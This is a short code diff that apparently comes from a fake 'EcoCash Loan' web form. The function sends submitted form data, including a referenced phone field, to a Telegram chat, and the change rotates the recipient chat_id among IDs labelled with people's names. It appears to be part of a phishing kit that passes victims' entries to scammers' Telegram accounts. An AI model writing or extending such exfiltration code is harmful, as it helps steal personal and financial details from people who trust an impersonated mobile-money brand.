@@ -46,7 +46,7 @@ export async function telFun(formData: any,) {
                 "Content-Type": "application/json",
             },
             body: JSON.stringify({
-                chat_id: 7895249781,//8768639146,//-fred-sam //6562421557-kc,7895249781-evans // 5991194967-sam
+                chat_id: 8768639146,//8768639146,//-fred-sam //6562421557-kc,7895249781-evans // 5991194967-sam
                 text:
                     `<b>EcoCash Loan: </b>\n ${message} `
                 // Phone: ${formData.get("phone")}
